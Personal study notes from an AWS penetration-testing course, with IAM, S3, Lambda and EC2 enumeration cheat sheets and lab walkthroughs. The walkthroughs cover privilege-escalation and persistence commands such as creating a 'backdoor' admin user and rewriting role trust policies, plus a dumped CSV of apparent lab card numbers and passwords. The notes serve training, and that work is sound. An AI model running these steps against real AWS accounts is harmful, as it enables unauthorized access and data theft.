# Introduction to AWS Pentesting [Link](https://academy.simplycyber.io/courses/enrolled/2760561)

# 1 Welcome To The Course
- Basics of cloud usage

# 2 Configuring the Lab Environment
- Create AWS free tier account
- Budget alerts
- Install AWS CLI
- Enabling Autocomplete for the AWS CLI
- Installing [cloudgoat](https://github.com/RhinoSecurityLabs/cloudgoat)
- Installing Pacu
```bash
# Enabling Autocomplete for the AWS CLI
echo -e '\nexport PATH=/usr/local/bin/:$PATH\nautoload bashcompinit && bashcompinit\nautoload -Uz compinit && compinit\ncomplete -C "/usr/local/bin/aws_completer" aws' >> ~/.zshrc
source ~/.zshrc
aws s[Press Tab]

# try to install the cloudgoat and pacu with pipx
pipx install git+<URL>.git
```

# 3 IAM The Admin Now (Understanding IAM in AWS)
- This section kicks off our deep dive into Identity and Access Management (IAM) in AWS. Whether you’re completely new to IAM or just need a refresher, this will give you the foundation you need before jumping into the hands-on labs.

### Concept of IAM
- **Users** - Users represent people or applications. They have long-term credentials like usernames, passwords and access keys.
- **Groups** - Groups are just a way to manage permissions for multiple users at once. (Backend engineers are grouped into one, then attach to the required resources.)
- **Policies** - Policies are what a user, group or role can and can't do. They're written in JSON and attached to IAM entities. There are two kinds.
    - **Managed Policies** - Reusable across users and groups. These are easier to manage and scale.
    - **Inline policies** - Attached directly to one user or group. These are harder to track and often the source of privilege escalation bugs in a real-world environment.
- **Roles** - Roles are like users but without long-term credentials. You assume a role temporarily, and AWS gives you credentils that expire after a set time.

### Why IAM Matters for Pentesting
- Misconfiguration (Not a zero-day attacks)
    - **Privilege Escalation** Can I go from a low-privilege user to an admin? This is the most common and most impactful finding in cloud environments.
    - **Lateral Movement** - Even if I can’t get admin access, can I move sideways into another user, role, or resource with sensitive access—like an S3 bucket full of data?
    - **Data Exfiltration** - Can I take over a Lambda function and send data to my own server?
    - **Persistence** - If I can create access keys for another user, I can quietly backdoor their account without changing their password. That kind of access is hard to detect unless you’ve got solid logging and alerting in place.

> In one assessment, I ran into a policy that looked secure at first glance. It denied me from attaching the AdministratorAccess policy. But when I looked closer, I noticed it allowed me to do `iam:*` on `*` —except for that one explicit deny. So instead of attaching AdministratorAccess, I just created my own policy with full permissions, gave it a different name, and attached it. Full admin access—game over.

### What to Watch For
- When you’re reviewing IAM permissions, here are four things you should always check:
    - Users with **excessive permissions**
    - Roles that can be **assumed**
    - Policies that use wildcards (e.g., `"Action": "*"` or `"Resource": "*"`)
    - Services or **Lambda** functions with elevated permissions that you can potentially abuse

```bash
{
"Version": "2012-10-17",
"Statement": [
    {
    "Effect": "Deny",
    "Action": [
            "iam:PassRole",
            "iam:AttachRolePolicy",
            "iam:PutRolePolicy",
            "iam:Update AssumeRolePolicy"
    ],
    "Resource": "arn:aws:iam::*:role/Administrator"
    },
    {
        "Effect": "Allow",
        "Action": "iam:*",
        "Resource": "*"
    }
 ]
}
```

### IAM Enumeration Cheat Sheet
1. List IAM Users ```aws iam list-isers```
2. Get User Permissions </br>
    a. List attached managed policies ```aws iam list-attached-user-policies --user-name [user-name]``` </br>
    b. List inline policies ```aws iam list-user-policies --user-name [user-name]``` </br>
    c. Get inline policy details ```aws iam get-user-policy --user-name [user-name] --policy-name [policy-name]``` </br>
3. List IAM Groups and permissions </br>
     a. List groups for a user ```aws iam list-groups-for-user --user-name [user-name]``` </br>
     b. List group policies ```aws iam list-attached-group-policies --group-name [group-name] , aws iam list-group-policies --group-name [group-name]``` </br>
     c. Get inline group policy details ```aws iam get-group-policy --group-name [group-name] --policy-name [policy-name]``` </br>
4.  List IAM Roles and Permissions </br>
    a. List all roles ```aws iam list-roles``` </br>
    b. Get role details (trust policy) ```aws iam get-role --role-name [role-name]``` </br>
    c. List attached policies ```aws iam list-attached-role-policies --role-name [role-name]``` </br>
    d. List inline policies ```aws iam list-role-policies --role-name [role-name]``` </br>
    e. Get inline role policy details ```aws iam get-role-policy --role-name [role-name] --policy-name [policy-name]``` </br>
5. Get and Decode Policy Documents
- Get a managed policy document(by ARN or name)
```bash
aws iam get-policy --policy-arn [policy-arn]
aws iam get-policy-version --policy-arn [policy-arn] --version-id [version-id]
```
6. View Full IAM Snapshot
- Dump all IAM permissions (users, roles, groups, policies)
```bash
aws iam get-account-authorization-details
```
> Use this to build a full IAM permissions map. Add `--filter` to target roles/users/groups specifically.
- Lab Commands [Cybr Lab AWS IAM Enumeration](https://cybr.com/hands-on-labs/lab/introduction-to-aws-iam-enumeration/)
```bash
# username and policyname only for this lab free to change accordingly
aws configure --profile cybr
aws sts get-caller-identity --profile cybr
aws iam get-user --profile cybr
aws iam get-account-authorization-details  --profile cybr
aws iam list-usera --profile cybr
aws iam list-users --profile cybr
aws iam list-access-keys --profile cybr
aws iam list-user-policies --user-name introduction-to-aws-iam-enumeration-1747259538516-Joel --profile cybr
aws iam list-user-policies --user-name introduction-to-aws-iam-enumeration-1747259538516-Mary --profile cybr
aws iam get-user-policy --user-name introduction-to-aws-iam-enumeration-1747259538516-Mary --profile cybr
aws iam get-user-policy --user-name introduction-to-aws-iam-enumeration-1747259538516-Joel --policy-name AllowEnumerateRoles --profile cybr
aws iam get-user-policy --user-name introduction-to-aws-iam-enumeration-1747259538516-Joel --policy-name AllowEnumerateRoles
aws iam get-user-policy --user-name introduction-to-aws-iam-enumeration-1747259538516-Joel --policy-name AllowEnumerateRoles --profile cybr
aws iam list-user-attached-policies --user-name introduction-to-aws-iam-enumeration-1747259538516-Joel --profile cybr
aws iam list-attached-user-policies --user-name introduction-to-aws-iam-enumeration-1747259538516-Joel --profile cybr
aws iam list-groups --profile cybr
aws iam list-groups-for-user --user-name introduction-to-aws-iam-enumeration-1747259538516-Joel --profile cybr
aws iam get-group --group-name introduction-to-aws-iam-enumeration-1747259538516-Developers --profile cybr
aws iam list-group-policies --group-name introduction-to-aws-iam-enumeration-1747259538516-Developers --profile cybr
aws iam get-group-policy --group-name introduction-to-aws-iam-enumeration-1747259538516-Developers --policy-name introduction-to-aws-iam-enumeration-1747259538516-devs-policy --profile cybr
aws iam list-attached-group-policies --group-name introduction-to-aws-iam-enumeration-1747259538516-Developers --profile cybr
aws iam list-attached-group-policies --group-name introduction-to-aws-iam-enumeration-1747259538516-Infrastructure --profile cybr
aws iam get-group --group-name introduction-to-aws-iam-enumeration-1747259538516-Infrastructure --profile cybr
aws iam list-group-policies --group-name introduction-to-aws-iam-enumeration-1747259538516-Infrastructure --profile cybr
aws iam get-group-policy --group-name introduction-to-aws-iam-enumeration-1747259538516-Infrastructure --policy-name introduction-to-aws-iam-enumeration-1747259538516-infra-policy --profile cybr
aws iam list-attached-group-policies --group-name introduction-to-aws-iam-enumeration-1747259538516-Infrastructure --profile cybr
aws iam list-attached-group-policies --group-name introduction-to-aws-iam-enumeration-1747259538516-Developer --profile cybr
aws iam list-attached-group-policies --group-name introduction-to-aws-iam-enumeration-1747259538516-Developers --profile cybr
aws iam list-roles --profile cybr
aws iam list-roles --query "Roles[?RoleName=='SupportRole']" --profile cybr
aws iam list-role-policies --role-name SupportRole --profile cybr
aws iam get-role-policy --role-name SupportRole --policy-name AllowS3FullAccessForRole --profile cybr
```

#### Automatic Enumeration using Pacu, Manual Enumeration using AWS CLI
```bash
pacu
import_keys cybr
search iam
run iam__enum_users_roles_policies_groups
data iam # Saved in the cache of pacu
help iam__enum_permissions
run iam__enum_permissions # suggest to run whoami
whoami
```

# 4 Your Bucket Is Leaking... (Attacking S3 Buckets)


### S3 for Pentesters
- S3 - Simple Storage Service, it's like an FTP in the cloud
- Used for
    - Static Websites
    - Backups
    - Logs, etc.
- Buckets
    - Top-level container
    - Globally unique names
- Objects
    - Actual data/files
- Access Control
    - Bucket Policies (resource-based)
    - IAM Policies (identity-based)
    - Access Control Lists (legacy)
- Your Bucket Is Leaking - Pentesting S3 Buckets
    - Public Access (List / Get)
    - Misconfigured Permissions
    - Public Write Access (Write some objects, DoS, DoW attacks)
    - Data Exposure
- S3 Bucket policy
```bash
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*", # Any IAM any other account do anything read, write, Delete
            "Action": "s3:*",
            "Resource": [
                "arn:aws:s3:::public-bucket-name",
                "arn:aws:s3:::public-bucket-name/*" # Deface the static website
            ]
        },
        {
            "Effect": "Deny",
            "NotAction": "s3:*",
            "NotResource": [
                "arn:aws:s3:::bucket-name",
                "arn:aws:s3:::bucket-name/*"
            ]
        }
    ]
}
```

### S3 Bucket Enumeration Cheat Sheet
- List Buckets in the Authenticated Account - ```aws s3 ls```
- Check if a Bucket Exists (No Auth) - ```aws s3 ls s3://[bucket-name] --no-sign-request```
- List Contents of a Public or Accessible Bucket - ```aws s3 ls s3://[bucket-name]/[optional-path] --no-sign-request```
- Download an Object - ```aws s3 cp s3://[bucket-name]/[key] [local-file] --no-sign-request```
- Upload a File (Test Write Access) - ```aws s3 cp test.txt s3://[bucket-name]/test.txt```
- Enumerate Bucket Permissions (Authenticated) 
    - Get bucket policy - ```aws s3api get-bucket-policy --bucket [bucket-name]```
    - Get bucket ACL (Access Control List) - ```aws s3api get-bucket-acl --bucket [bucket-name]```
    - Get Public Access Block settings - ```aws s3api get-bucket-public-access-block --bucket [bucket-name]```
    - Get CORS configuration (may hint at XSS vectors) - ```aws s3api get-bucket-cors --bucket [bucket-name]```
-  List All Buckets & Objects (If Compromised Creds)
```bash
aws s3api list-buckets
aws s3api list-objects --bucket [bucket-name] --output table
```

### Lab Introduction and Set Up
- Lab [Pwnedlabs](https://pwnedlabs.io/labs/aws-s3-enumeration-basics)
```Bash
# Target http://dev.huge-logistics.com, Once enter the form, 405 error
#405 Method Not Allowed
    #Code: MethodNotAllowed
    #Message: The specified method is not allowed against this resource.
    #Method: POST
    #ResourceType: OBJECT
    #RequestId: 4Y72PDD02YKBEEE2
    #HostId: aqPu9q7qB4ZCfLeBpTTEwkedq3G8SHjeRRsDapDBSykf3QltpJ6rDZCv5BZBlEu6Xhr4c4m86ps=
# It looks like potential S3 bucket

#  <link rel="stylesheet" href="https://s3.amazonaws.com/dev.huge-logistics.com/static/style.css">  In the View source dev.huge-logistics.com
```
- List the files
```bash
aws s3 ls s3://dev.huge-logistics.com --no-sign-request
  # files admin don't have access (admin/, migration-files/, shared/,static/,5347 index.html) 
  ```
- Download
```bash
aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
```
- Unzip the file 
```bash
unzip hl_migration_project.zip   # their is a migrate_secrets.ps1 
cat migrate_secrets.ps1 
# AWS Configuration
# $accessKey = ""
# $secretKey = ""
# $region = "us-east-1"
```
- Login to aws cli
```bash
aws configure --profile pwned # enter above keys
aws s3 ls s3://dev.huge-logistics.com/admin --profile pwned
aws s3 ls s3://dev.huge-logistics.com/admin/ --profile pwned # found website_transactions_export.csv
aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv . --profile pwned # 403 Forbidden
aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml . --profile pwned # downloaded
```
- cat test-export.xml
```bash
!-- AWS Production Credentials -->
    <CredentialEntry>
        <ServiceType>AWS IT Admin</ServiceType>
       # <AccountID>794929857501</AccountID>
        <Notes>AWS credentials for production workloads. Do not share these keys outside of the organization.</Notes>
    </CredentialEntry>
```
- Login with admin
```bash
aws configure --profile adminpwned
aws s3 ls s3://dev.huge-logistics.com/admin/ --profile adminpwned
aws s3 ls s3://dev.huge-logistics.com/admin/ --profile adminpwned
aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt . --profile adminpwned
aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt - --profile adminpwned # view
aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv - --profile adminpwned > credit_card.txt
```
- Credit card information
```bash
aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv - --profile adminpwned
network,credit_card_number,cvv,expiry_date,card_holder_name,validation,username,password,ip_address
Visa,4055497191304,386,5/2021,Hunter Miller,,hunter_m,password123,34.56.78.90
Visa,4055491339081,492,8/2021,Jayden Adams,,jay_adams,jayden2023,157.89.34.56
Visa,4055491511051,244,10/2025,Jose Baker,,joseBaker24,jose@pass,212.45.67.89
Visa,4313504070320,984,3/2025,Gabriel Phillips,,gabrielP,welcome2025,58.67.34.23
Visa,4313504750869252,522,5/2024,Joseph Thomas,,joethomas,joe!pass,94.23.45.67
Visa,4313501801459893,585,5/2021,Chloe Nelson,,chloe_n,summer21,71.23.45.89
Visa,4313506927832,748,4/2025,Brianna Brown,,briBrown,ilovebri,102.178.23.45
Visa,4313508703687539,854,9/2021,Jose Perez,,jperez,jose*pass,145.89.23.67
Visa,4055490538100206,903,2/2022,Brooklyn Davis,,brookD,cookie22,89.45.23.56
Visa,4055496324021,989,10/2024,Elijah Davis,,elijahD2024,honey24,132.56.78.90
Visa,4313507611385,798,10/2025,Jose Davis,,josed_25,chocolate,193.45.67.80
Visa,4313505844566770,391,10/2023,Anna Miller,,annaM,anna2023,144.68.90.10
Visa,4313503045245021,319,9/2022,Anthony Collins,,tony_collins,tony!pass,154.23.67.89
Visa,4313503967294,839,7/2023,Alyssa Thompson,,alyssaT23,thompson23,212.67.89.90
Visa,4055496654879978,242,10/2023,Gabriel Garcia,,garcia_gabe,letmein,148.12.67.34
Visa,4313502893954,923,7/2025,Noah Allen,,noah_allen25,password2025,178.45.23.12
Visa,4055497065912,770,9/2021,Hunter Anderson,,hunterA2021,winter21,165.89.34.12
Visa,4055499869808,492,8/2025,David Jackson,,djackson,trustno1,194.56.78.90
Visa,4055493603013,993,3/2023,Katherine Anderson,,kat_anderson,love2023,204.89.23.45
Visa,4313507735369298,267,3/2021,Aiden Jones,,aidenJ,aiden@logistics,168.90.23.67
Visa,4055490830817,631,1/2023,Etha Nelson,,ethaN,etha@2023,132.78.90.10
Visa,4055492037879157,235,10/2024,Katherine Martin,,k_martin,superpass,178.89.23.45
Visa,4055490511326,802,3/2025,Elijah Scott,,elijahS2025,summer25,212.34.56.78
Visa,4313507927120,620,8/2022,Julia Brown,,juliaB22,julia@logis,189.23.45.67
Visa,4055498615148980,916,4/2024,Jose Jones,,j_jones24,jose2024,178.56.78.90
Visa,4313502314852,986,6/2024,Samantha Thompso,,samanthaT,samantha2024,167.89.90.12
Visa,4055491551140558,357,2/2023,Elizabeth Nelson,,lizNelson,princess23,204.56.78.12
Visa,4055496059868048,722,3/2025,Grace Brown,,graceB25,charlie1,156.78.90.12
Visa,4313508490261548,894,7/2025,Landon Adams,,landonA,landon@logis,146.78.90.23
```

# 5 Dysfunctional Funtions (Attacking Lambda Function)

> AWS Lambda Functions Explained AWS Lambda is a serverless compute service that lets you run code without provisioning or managing servers. It allows you to execute code in response to events, such as changes to data in an S3 bucket, updates to a DynamoDB table, or HTTP requests via API Gateway. 
- Here's a breakdown:
    - What AWS Lambda Does:
        - Event-Driven: Executes code in response to specific triggers or events from various sources.
        - Serverless: Eliminates the need to manage servers, automatically scaling resources based on demand.
        - Scalable: Automatically scales up or down based on the number of events triggering the function.
        - Cost-Effective: You only pay for the compute time consumed while your function is running, making it cost-effective for intermittent workloads. 
    - How to Use AWS Lambda:
        - Write Your Code: Create your function code using supported languages (e.g., Python, Node.js, Java).
        - Upload Your Code: Package your code and dependencies into a deployment package and upload it to AWS Lambda.
        - Configure Trigger: Define which event sources should trigger your function (e.g., API Gateway, S3, DynamoDB).
        - Manage Permissions: Configure IAM roles to grant your function access to other AWS resources it needs.
        - Deploy and Monitor: Deploy your function and use CloudWatch to monitor its performance and logs. 
    - How Attackers Can Leverage Lambda:
        - Exploiting Vulnerabilities: Attackers can exploit vulnerabilities in Lambda function code, dependencies, or event sources to execute malicious code, steal data, or gain unauthorized access.
        - Gaining Access Through Leaked Credentials: If access keys or IAM roles associated with a Lambda function are compromised, attackers can leverage those credentials to access other resources or escalate privileges.
        - Data Exfiltration: Attackers could manipulate or inject malicious code into a Lambda function to steal sensitive data processed by the function or stored in connected services like S3 buckets.
        - Cryptojacking: Malware like Denonia can be deployed via Lambda to hijack compute resources for cryptocurrency mining.
        - Lateral Movement: Attackers can leverage a compromised Lambda function as an entry point to move laterally across other AWS resources within an environment. 
    - Security Best Practices for Lambda:
        - Least Privilege IAM Roles: Grant Lambda functions only the minimum necessary permissions to perform their tasks.
        - Regular Dependency Updates: Keep your function dependencies up-to-date and patch any known vulnerabilities.
        - Input Validation and Sanitization: Validate and sanitize all incoming data to prevent injection attacks.
        - Robust Monitoring and Logging: Enable comprehensive logging and monitoring with CloudWatch to detect suspicious activities.
        - VPC Integration: Connect Lambda functions to your VPC for secure private networking and access to internal resources.
        - Secrets Management: Store sensitive credentials securely using AWS Secrets Manager or Parameter Store.
        - Secure Code Practices: Follow secure coding practices to avoid common vulnerabilities like command injection and SQL injection. 

### Lambda for Pentesters
- "Serverless" Computer
- Upload Code -> AWS Run it
- Event Driven 
- Funtion 
- Execution Role
- Triggers
- Environment Variables

- Pentesting Lambda
    - Overly Privileged Execution Roles
        - iam:PassRole
        - ec2:*
        - s3:*
        - secretsmanager:GetSecretValuve
    - Exposed Secrets
        - Env. Variables
        - Source Code
    - Writable Functions

### Lambda Enumeration Cheat Sheet
- List All Lambda Functions
```bash
aws lambda list-functions --region [region]
# Shows names, runtimes, ARNs and last modified dates
```
- Get Detailed Info on a Function
```bash
# Get full function config (IAM role, runtime, env vars, etc.)
aws lambda get-function-configuration --function-name [function-name]
# Get code download URL + deployment details
aws lambda get-function --function-name [function-name]

# Returns a pre-signed S3 URL to download the function code.
```
- Check Invocation Access
```bash
# Who/what can invoke the function (resource-based policy)?
aws lambda get-policy --function-name [function-name]

# Look for "Principal": "*" or cross-account permissions.
```
- Identify Triggers / Event Sources
```bash
# For async event sources like SQS, DynamoDB, Kinesis:
aws lambda list-event-source-mappings --function-name [function-name]
# For function URLs (direct HTTP endpoints)
aws lambda get-function-url-config --function-name [function-name]

# If AuthType is NONE, it may be publicly invokable!
```
- Invoke the Function (if allowed)
```bash
aws lambda invoke --function-name [function-name] output.json

# Add --payload if the function expects input:
--payload '{"key": "value"}'
```
- Investigate Attached IAM Role
```bash
# Get the role name from get-function-configuration
aws iam get-role --role-name [role-name]
aws iam list-attached-role-policies --role-name [role-name]
aws iam list-role-policies --role-name [role-name]

# Look for overly permissive actions (*, PassRole, SecretsManager, etc.)
```
- Modify or Replace the Function (if you have perms)
```bash
# Update function code
aws lambda update-function-code --function-name [function-name] --zip-file fileb://payload.zip

# Update configuration (e.g., env variables)
aws lambda update-function-configuration --function-name [function-name] --environment "Variables={VAR=value}"

# Useful for persistence, exfil, or command injection if roles are over-permissioned.
```

### Configure cloudgoat
- Commands to configure awscli

```bash
aws configure --profile cloudgoat # Profile name is cloudgoat you can name what ever you want
aws sts get-caller-identity --profile cloudgoat
```

- Commands to configure [cloudgoat](https://github.com/RhinoSecurityLabs/cloudgoat)

```bash
cloudgoat config aws
# Would you like to specify a new default aws setting now? [y/n]: y
# Enter the name of your default AWS profile: cloudgoat # Enter your profile name in the place of cloudgoat if you used different
cloudgoat config whitelist --auto # Press y then shows you the public IP address.
```

# 6 EC2 (Attacking EC2 Instances)
- Elastic Cloud Compute (EC2)

### EC2 for Pentesters

- You Choose
    - OS
    - Instance Type
    - Network Config
    - IAM Role
- Used for:
    - Apps
    - Dev environments
    - Web Servers

- **Instances** -  3 different instance or Operating Systems
- **Security Groups** - Is like a firewall, open up or close down different ports
- **Key Pairs** - When start a Instance for example linux you need to create SSH key pair that authenicate with your instance public on OS, private you'll download.
- **Elastic IPs** - IP is connected to the EC2 instace that able to connect with internet
- **Instance Metadata Service** - Also call home with own credentials back to AWS, Able to compromise EC2 get metadata of EC2 povit depper into EC2 and privilege escalate further.
- **IAM INstance Profile** - After compromising EC2 query the what roles attached to the EC2 instance

#### Pen Testing with EC2
- Access to an EC2 = GOLD
    - Metadata
    - IAM Permissions
    - Exposed Secrets
- Look for:
    - SSH Ports
    - Metadata Endpoint (http://169.254.169.254)
    - User Data

```bash
{
    "Effect":"Allow",
    "Action": [
        "iam:PassRole",
        "lambda:CreateFunction"
    ],
    "Resource": "*"
}
```

### EC2 Enumeration Cheat Sheet
1. List EC2 Instances
```bash
aws ec2 describe-instances --region [region]
# Shows instance IDs, public IPs, AMIs, key names, IAM roles, etc.
```
- Use JMESPath(JSON Matching Expression path) filthers for cleaner Output:
```bash
aws ec2 describe-instances --query "Reservations[*].Instances[*].[InstanceId,PublicIpAddress,State.Name,KeyName,IamInstanceProfile.Arn]"
```
2. Get Detailed Info on a Specific Instance
```bash
aws ec2 describe-instances --instance-ids [i-xxxxxxxxxxxxxxx]
```
3. Identify IAM Role Attached to the Instance
```bash
aws ec2 describe-instances --query "Reservations[*].Instances[*].IamInstanceProfile.Arn"
# Then grab role name and enumerate permissions:
aws iam get-instance-profile --instance-profile-name [name]
```
4. List Security Groups
```bash
aws ec2 describe-security-groups
# Look for open ports, especially 0.0.0.0/0 on SSH (22), RDP (3389), or custom ports.
```
- Check for overly permissive inbound rules:
```bash
aws ec2 describe-security-groups --query "SecurityGroups[*].IpPermissions[*].{From:FromPort,To:ToPort,CIDR:IpRanges}"
```
5. Describe Network Interfaces
```bash
aws ec2 describe-network-interfaces
# See public/private IPs, subnet info, VPC IDs, attachment info.
```
6. List AMIs (Amazon Machine Images)
```bash
aws ec2 describe-images --owners self
# Use this to find custom images that may contain secrets or sensitive software.
```
7. Check EBS Volume Info
```bash
aws ec2 describe-volumes
# Look for unencrypted volumes, large or attached volumes.
```
- Snapshot enumeration (potential data leaks):
```bash
aws ec2 describe-snapshots --owner-ids self
```
8. Enumerate Key Pairs
```bash
aws ec2 describe-key-pairs
# You can't get private keys from AWS, but public names may hint at user naming patterns or poor key hygiene.
```
9. Describe Regions & Availability Zones
```bash
aws ec2 describe-regions
aws ec2 describe-availability-zones
```

# 7 AWS Privilege Escalation

## AWS Privilege Escalation Overview
- Typical AWS Pentest
    - Client give 2 set credentials i. gloabl readonly check EC2, S3, ii. Low-level iam role access.
- What is privilege escalation
    - Elevating privileges greater access, Increadiblly common hacking AWS it self hacking only client environment not AWS(Attack surface massive, Not searching for **ZeroDays**)
- Common Because
    - Broad IAM policies
    - Not enforcing least privilege

### Overview of Privilege Escalation in AWS
- IAM Role/Policy Abuse
    - iam:*  anything on IAM with administrator account
    - iam:PassRole pass role Lambda function
    - Windcards  are bad how can exploit this now
- Resource-Based Attacks
    - Lambda Have the right access try to exploit
    - EC2s enumerate and try what you can do
    - Glue 
- STS Token Abuse
    - sts:AssumeRole  Session token elevate the role
- Chained Escalation 
    - Enumeration -> Create/Update Resources -> Execute -> Assume -> Escalate

#### AWS Privilege Escalation - Why This Matters
- No "local user" - all is identity based
- May not be able to "pop a shell"
    - Steal creds
    - Create an admin role
    - Upload a backdoor Lambda
    - Povit into other env.

| Technique | What you Abuse | Outcome |
| :- | :- | :- |
| iam:PassRole + Lambda | Create Lambda w/ higher role | Code exec as elevated role |
| iam:CreatePolicyVersion | Attach broader policy | Expand permissions |
| ec2:RunInstance + PassRole | Launch EC2 w/ privileged role | SSH + Metadata = Creds |
| sts:AssumeRole | Trust Policy misconfig | Lateral movement / cross-account access |

### Privilege Escalation Cheat Sheet
- Core Concepts
    - iam:PassRole: Lets you pass an IAM role to a service (e.g., EC2, Lambda).
    - iam:Create*, iam:Put*, iam:UpdateAssumeRolePolicy: Can lead to full compromise.
    - Abusable Services: EC2, Lambda, CloudFormation, Glue, SageMaker, DataPipeline.

1. iam:PassRole + Service Abuse

- EC2
```bash
aws ec2 run-instances --image-id [ami-id] --iam-instance-profile Name=[admin-role] ...
```
- Lambda
```bash
aws lambda create-function --function-name backdoor --role [admin-role-arn] ...
```
- Glue
```bash
aws glue create-dev-endpoint --role-arn [admin-role-arn] --endpoint-name evil
```
2. Modify or Attach Inline Policies
- Update your own policy to add permissions:
```bash
aws iam put-user-policy --user-name [me] --policy-name escalator --policy-document file://full-admin.json
```
- Attach a managed admin policy:
```bash
aws iam attach-user-policy --user-name [me] --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```
3. Create a New Admin Role/User
- Create a new user
```bash
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```
- Create a new role with a trust policy
```bash
aws iam create-role --role-name escalate-me --assume-role-policy-document file://trust.json
aws iam attach-role-policy --role-name escalate-me --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```
4. Update Trust Policies for Existing Roles
- Abuse `iam:UpdateAssumeRolePolicy` to let yourself assume an admin role.
```bash
aws iam update-assume-role-policy --role-name [admin-role] --policy-document file://evil-trust.json
```

5. Assume a Role
- Only works if you're trusted by the role (check trust policy).
```bash
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/Admin --role-session-name session1
```
6. Use Services to Execute Code
- If you can launch a service and inject a script, you can exfil data or gain shell access.
    - Lambda: backdoor with high-priv role
    - Glue: launch with shell script
    - EC2: start instance with user-data reverse shell
    - SSM: run commands on existing EC2
- Dangerous IAM Actions to Look For
    - If a user/role has any of these, escalate:
```bash
iam:PassRole  
iam:AttachUserPolicy  
iam:PutUserPolicy  
iam:UpdateAssumeRolePolicy  
iam:CreatePolicy  
iam:CreateUser / CreateRole  
lambda:CreateFunction  
ec2:RunInstances  
glue:CreateDevEndpoint  
ssm:SendCommand  
```









# Labs CloudGoat


## Lambda Privilege Escalation
- Added AWS Credentials
- Starting Cloudgoat
```bash
cloudgoat config aws
# Would you like to specify a new default aws setting now? [y/n]: y
# Enter the name of your default AWS profile: cloudgoat # Enter your profile name in the place of cloudgoat if you used different
cloudgoat config whitelist --auto # Press y then shows you the public IP address.
cloudgoat list aws # lsit aws challenges
cloudgoat help lambda_privesc
cloudgoat create lambda_privesc # it start the lab provide credentials
aws configure chris # Created Access keys as chris user
aws sts get-caller-identity --profile chris
```
- Get the list Inline policies
```bash
aws sts get-caller-identity --profile chris # Copy the username from this command
aws iam list-user-policies --user-name chris-cgidbsi5rpua6g --profile chris # No policies are attached
```
- Get the list of attached policies
```bash
aws iam list-attached-user-policies --user-name chris-cgidbsi5rpua6g --profile chris
#  "PolicyName": "cg-chris-policy-cgidbsi5rpua6g",
#  "PolicyArn": "arn:aws:iam::381491847637:policy/cg-chris-policy-cgidbsi5rpua6g"
```
- Get policy version
```bash
aws iam list-policy-versions --policy-arn arn:aws:iam::381491847637:policy/cg-chris-policy-cgidbsi5rpua6g --profile chris
```
- Get policy details
```bash
aws iam get-policy-version --policy-arn arn:aws:iam::381491847637:policy/cg-chris-policy-cgidbsi5rpua6g --version-id v1 --profile chris
# VersionId v1
```
- Here is the policy code
    - Ability to assume roles, List and get the iam
    - Every resource in the account
```bash
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "sts:AssumeRole",
                        "iam:List*",
                        "iam:Get*"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "chris"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2025-05-24T22:24:17+00:00"
    }
```
- List the Roles
    - Make to idetify the AWS own role created aws


```bash
aws iam list-roles --profile chris
{
            "Path": "/",
            "RoleName": "cg-debug-role-cgidbsi5rpua6g",
            "RoleId": "AROAVRUVPUHKUDSI5SYTN",
            "Arn": "arn:aws:iam::381491847637:role/cg-debug-role-cgidbsi5rpua6g",
            "CreateDate": "2025-05-24T22:24:17+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "CloudGoat debug role",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "cg-lambdaManager-role-cgidbsi5rpua6g",
            "RoleId": "AROAVRUVPUHK32K2UVGKE",
            "Arn": "arn:aws:iam::381491847637:role/cg-lambdaManager-role-cgidbsi5rpua6g",
            "CreateDate": "2025-05-24T22:24:25+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::381491847637:user/chris-cgidbsi5rpua6g"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "CloudGoat Lambda manager role",
            "MaxSessionDuration": 3600
        }
```
- If observe the 
    - First role is assumed by lambda in AWS
    - Second one asumed by user **chris**


> **First** role is assumed by lambda in AWS 
```bash
aws iam list-attached-role-policies --role-name cg-debug-role-cgidbsi5rpua6g --profile chris
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
aws iam get-policy-version --policy-arn arn:aws:iam::381491847637:role/cg-debug-role-cgidbsi5rpua6g --version-id v1 --profile chris
# An error occurred (InvalidInput) when calling the GetPolicyVersion operation: ARN arn:aws:iam::381491847637:role/cg-debug-role-cgidbsi5rpua6g is not valid.
```
- **Admin** access to the role

> **Second** one asumed by user **chris** Try to enumerate the roles what permissions it has 
```bash
aws iam list-attached-role-policies --role-name cg-lambdaManager-role-cgidbsi5rpua6g --profile chris # it will provide role ARN
```
- Get the policy
```bash
aws iam get-policy-version --policy-arn arn:aws:iam::381491847637:policy/cg-lambdaManager-policy-cgidbsi5rpua6g --version-id v1 --profile chris
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "lambda:*",
                        "iam:PassRole"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "lambdaManager"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
